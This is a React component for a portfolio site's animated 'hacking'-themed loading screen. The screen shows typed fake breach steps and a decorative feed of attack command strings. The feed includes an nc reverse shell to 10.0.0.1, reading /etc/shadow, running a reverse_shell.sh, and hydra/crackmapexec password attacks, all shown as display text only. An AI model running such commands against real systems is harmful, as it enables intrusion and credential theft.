import { useState, useEffect, useRef, lazy, Suspense } from 'react';
import { gsap } from 'gsap';
import GridScan from './components/Gridscan';

// Lazy load main content for better performance
const MainContent = lazy(() => import('./components/MainContent'));

// Preload MainContent while showing loading screen
const mainContentPromise = import('./components/MainContent');

const hackingSteps = [
  { text: 'Initializing secure connection...', status: 'DONE' },
  { text: 'Reconing the target...', status: 'DONE' },
  { text: 'Scanning open ports...', status: 'DONE' },
  { text: 'Finding vulnerabilities...', status: 'DONE' },
  { text: 'Exploit successful', status: 'ACCESS GRANTED' },
];

const App = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedText, setDisplayedText] = useState('');
  const [showStatus, setShowStatus] = useState(false);
  const [progress, setProgress] = useState(0);
  const [contentReady, setContentReady] = useState(false);
  const [animationComplete, setAnimationComplete] = useState(false);
  
  const containerRef = useRef(null);
  const progressBarRef = useRef(null);

  // Preload content while showing loading animation
  useEffect(() => {
    mainContentPromise.then(() => setContentReady(true));
  }, []);

  // Typing effect for each step
  useEffect(() => {
    if (!isLoading) return;
    
    if (currentStep >= hackingSteps.length) {
      setAnimationComplete(true);
      return;
    }

    const step = hackingSteps[currentStep];
    let charIndex = 0;
    setDisplayedText('');
    setShowStatus(false);

    const typeInterval = setInterval(() => {
      if (charIndex <= step.text.length) {
        setDisplayedText(step.text.slice(0, charIndex));
        charIndex++;
      } else {
        clearInterval(typeInterval);
        setShowStatus(true);
        
        // Update progress
        const newProgress = ((currentStep + 1) / hackingSteps.length) * 100;
        if (progressBarRef.current) {
          gsap.to(progressBarRef.current, {
            width: `${newProgress}%`,
            duration: 0.5,
            ease: 'power2.out',
          });
        }
        setProgress(newProgress);

        // Move to next step
        setTimeout(() => {
          setCurrentStep(prev => prev + 1);
        }, 300);
      }
    }, 20);

    return () => clearInterval(typeInterval);
  }, [currentStep, isLoading]);

  // Only transition when both animation is complete AND content is loaded
  useEffect(() => {
    if (animationComplete && contentReady) {
      setTimeout(() => {
        gsap.to(containerRef.current, {
          opacity: 0,
          scale: 1.1,
          filter: 'blur(10px)',
          duration: 0.5,
          ease: 'power2.inOut',
          onComplete: () => setIsLoading(false),
        });
      }, 400);
    }
  }, [animationComplete, contentReady]);

  return (
    <div className="min-h-screen text-white" style={{ backgroundColor: '#020625' }}>
      {/* Loading Screen */}
      {isLoading && (
        <div
          ref={containerRef}
          className="fixed inset-0 z-50 overflow-hidden"
          style={{ backgroundColor: '#020625' }}
        >
          {/* GridScan Background */}
          <div className="absolute inset-0 w-full h-full">
            <GridScan
              sensitivity={0.55}
              lineThickness={1}
              linesColor="#0a1628"
              gridScale={0.1}
              scanColor="#00ff88"
              scanOpacity={0.4}
              enablePost={true}
              bloomIntensity={0.6}
              chromaticAberration={0.002}
              noiseIntensity={0.01}
            />
          </div>

          {/* Scanlines Overlay */}
          <div 
            className="absolute inset-0 pointer-events-none opacity-30"
            style={{
              background: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 255, 0.03) 2px, rgba(0, 255, 255, 0.03) 4px)',
            }}
          />

          {/* Terminal Container */}
          <div className="absolute inset-0 flex items-center justify-center p-4">
            <div
              className="w-full max-w-3xl bg-[#0a1628]/90 border border-[#00ffff]/30 rounded-lg overflow-hidden backdrop-blur-sm"
              style={{
                boxShadow: '0 0 40px rgba(0, 255, 255, 0.15), inset 0 0 60px rgba(138, 43, 226, 0.05)',
              }}
            >
              {/* Terminal Header - Kali Linux Style */}
              <div className="flex items-center justify-between px-4 py-3 bg-[#1a1a2e] border-b border-[#00ffff]/20">
                {/* Window Control Buttons - Kali Style */}
                <div className="flex items-center gap-2">
                  {/* Close Button */}
                  <div className="group relative w-4 h-4 rounded-full bg-[#ff5f56] hover:bg-[#ff3b30] cursor-pointer transition-colors flex items-center justify-center">
                    <svg className="w-2 h-2 text-[#4a0000] opacity-0 group-hover:opacity-100 transition-opacity" viewBox="0 0 12 12" fill="currentColor">
                      <path d="M6.707 6l3.646-3.646a.5.5 0 00-.707-.708L6 5.293 2.354 1.646a.5.5 0 10-.708.708L5.293 6l-3.647 3.646a.5.5 0 00.708.708L6 6.707l3.646 3.647a.5.5 0 00.708-.708L6.707 6z"/>
                    </svg>
                  </div>
                  {/* Minimize Button */}
                  <div className="group relative w-4 h-4 rounded-full bg-[#ffbd2e] hover:bg-[#f5a623] cursor-pointer transition-colors flex items-center justify-center">
                    <svg className="w-2 h-2 text-[#995700] opacity-0 group-hover:opacity-100 transition-opacity" viewBox="0 0 12 12" fill="currentColor">
                      <rect x="2" y="5.5" width="8" height="1" rx="0.5"/>
                    </svg>
                  </div>
                  {/* Maximize Button */}
                  <div className="group relative w-4 h-4 rounded-full bg-[#27c93f] hover:bg-[#1db954] cursor-pointer transition-colors flex items-center justify-center">
                    <svg className="w-2 h-2 text-[#0a5f1c] opacity-0 group-hover:opacity-100 transition-opacity" viewBox="0 0 12 12" fill="currentColor">
                      <rect x="2" y="2" width="8" height="8" rx="1" fill="none" stroke="currentColor" strokeWidth="1.5"/>
                    </svg>
                  </div>
                </div>

                {/* Terminal Title - Center */}
                <div className="flex items-center gap-1 absolute left-1/2 transform -translate-x-1/2">
                  <span className="text-[#00ffff] font-bold text-sm" style={{ fontFamily: 'var(--font-heading)' }}>pradeep</span>
                  <span className="text-white/60 text-sm">@</span>
                  <span className="text-[#ff6b9d] font-bold text-sm" style={{ fontFamily: 'var(--font-heading)' }}>kali</span>
                  <span className="text-white/40 text-sm mx-1">:</span>
                  <span className="text-[#8a2be2] text-sm font-bold">~</span>
                </div>

                {/* Right side - Menu icons */}
                <div className="flex items-center gap-3 text-white/50">
                  <svg className="w-4 h-4 hover:text-[#00ffff] cursor-pointer transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                  </svg>
                  <svg className="w-4 h-4 hover:text-[#00ffff] cursor-pointer transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16" />
                  </svg>
                </div>
              </div>

              {/* Command Line Bar */}
              <div className="flex items-center gap-1 px-4 py-2 bg-[#0a1628]/80 border-b border-[#00ffff]/10">
                <span className="text-[#00ffff]/70 text-xs">$</span>
                <span className="ml-1 text-white/80 text-xs font-mono">
                  ./exploit.sh --target portfolio --mode stealth
                </span>
              </div>

              {/* Terminal Body */}
              <div className="p-8 font-mono text-base min-h-[400px]">
                {/* Completed Steps */}
                {hackingSteps.slice(0, currentStep).map((step, index) => (
                  <div key={index} className="flex items-center gap-2 mb-2 text-[#00ffff]/80">
                    <span className="text-[#00ffff]">[*]</span>
                    <span style={{ fontFamily: 'var(--font-body)' }}>{step.text}</span>
                    <span className="ml-auto text-cyan-400" style={{ fontFamily: 'var(--font-heading)' }}>[{step.status}]</span>
                  </div>
                ))}

                {/* Current Step */}
                {currentStep < hackingSteps.length && (
                  <div className="flex items-center gap-2 text-[#00ffff]">
                    <span className="animate-pulse">[*]</span>
                    <span style={{ fontFamily: 'var(--font-body)' }}>{displayedText}</span>
                    <span className="animate-pulse">_</span>
                    {showStatus && (
                      <span className="ml-auto text-cyan-400 animate-pulse" style={{ fontFamily: 'var(--font-heading)' }}>
                        [{hackingSteps[currentStep].status}]
                      </span>
                    )}
                  </div>
                )}

                {/* Waiting for content indicator */}
                {animationComplete && !contentReady && (
                  <div className="flex items-center gap-2 mt-4 text-[#ffbd2e]">
                    <span className="animate-pulse">[~]</span>
                    <span style={{ fontFamily: 'var(--font-body)' }}>Establishing secure connection...</span>
                    <span className="animate-spin">⟳</span>
                  </div>
                )}

                {/* Progress Bar */}
                <div className="mt-8">
                  <div className="flex justify-between text-[#00ffff]/60 text-xs mb-2">
                    <span style={{ fontFamily: 'var(--font-heading)' }}>SYSTEM BREACH PROGRESS</span>
                    <span style={{ fontFamily: 'var(--font-neuton)' }}>{Math.round(progress)}%</span>
                  </div>
                  <div className="h-2 bg-[#0a1628] rounded-full overflow-hidden border border-[#00ffff]/20">
                    <div
                      ref={progressBarRef}
                      className="h-full bg-gradient-to-r from-[#00ffff] to-[#8a2be2] rounded-full"
                      style={{
                        width: '0%',
                        boxShadow: '0 0 10px #00ffff, 0 0 20px #8a2be2',
                      }}
                    />
                  </div>
                </div>

                {/* Hacking Commands Stream */}
                <div className="mt-8 text-[#00ffff]/70 text-xs overflow-hidden border-t border-[#00ffff]/10 pt-4">
                  <div className="text-[#00ffff]/40 mb-2 text-xs uppercase tracking-wider" style={{ fontFamily: 'var(--font-medieval)' }}>Live Terminal Feed</div>
                  <RandomDataStream />
                </div>
              </div>
            </div>
          </div>

          {/* Corner Decorations */}
          <div className="absolute top-4 left-4 text-[#00ffff]/50 text-xs" style={{ fontFamily: 'var(--font-neuton)' }}>
            <div>IP: 192.168.1.{Math.floor(Math.random() * 255)}</div>
            <div>PORT: {3000 + Math.floor(Math.random() * 1000)}</div>
          </div>
          <div className="absolute top-4 right-4 text-[#00ffff]/50 text-xs text-right" style={{ fontFamily: 'var(--font-neuton)' }}>
            <div>PACKETS: {Math.floor(Math.random() * 9999)}</div>
            <div>LATENCY: {Math.floor(Math.random() * 50)}ms</div>
          </div>
          
          {/* Bottom Signature */}
          <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 text-center">
            <div className="text-[#8a2be2]/60 text-sm" style={{ fontFamily: 'var(--font-felipa)' }}>Pradeep Kumawat</div>
            <div className="text-[#00ffff]/30 text-xs mt-1" style={{ fontFamily: 'var(--font-story)' }}>Cybersecurity Enthusiast</div>
          </div>
        </div>
      )}
      
      {/* Main Content - No fallback needed since we wait for content to load */}
      {!isLoading && (
        <Suspense fallback={null}>
          <MainContent />
        </Suspense>
      )}
    </div>
  );
};

// Meaningful hacking commands stream
const RandomDataStream = () => {
  const [lines, setLines] = useState([]);

  const hackingCommands = [
    'nmap -sV -sC -p- 192.168.1.105 --script=vuln',
    'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
    'sqlmap -u "http://target/page?id=1" --dbs --batch',
    'msfconsole -q -x "use exploit/multi/handler"',
    'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
    'gobuster dir -u http://target -w /usr/share/dirb/wordlists/common.txt',
    'nikto -h http://target -output scan_results.txt',
    'wpscan --url http://target --enumerate u,p,t',
    'searchsploit apache 2.4.49 | grep -i "remote"',
    'curl -X POST http://target/api/login -d "user=admin&pass=test"',
    'hashcat -m 0 -a 0 hashes.txt wordlist.txt --force',
    'netcat -lvnp 4444 > Listening on 0.0.0.0:4444',
    'python3 exploit.py --target 192.168.1.105 --lhost 10.0.0.1',
    'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap',
    'metasploit: payload => windows/meterpreter/reverse_tcp',
    'chmod +x reverse_shell.sh && ./reverse_shell.sh',
    'nc -e /bin/bash 10.0.0.1 4444 # reverse shell established',
    'cat /etc/shadow | grep root > Extracting password hashes...',
    'sudo tcpdump -i eth0 -w capture.pcap -c 1000',
    'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
  ];

  useEffect(() => {
    const addLine = () => {
      const cmd = hackingCommands[Math.floor(Math.random() * hackingCommands.length)];
      setLines(prev => {
        const newLines = [...prev, cmd];
        if (newLines.length > 4) newLines.shift();
        return newLines;
      });
    };

    addLine();
    const interval = setInterval(addLine, 800);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="space-y-1">
      {lines.map((line, i) => (
        <div key={i} className="truncate opacity-60 hover:opacity-100 transition-opacity">
          <span className="text-[#00ffff]">$ </span>{line}
        </div>
      ))}
    </div>
  );
};

export default App;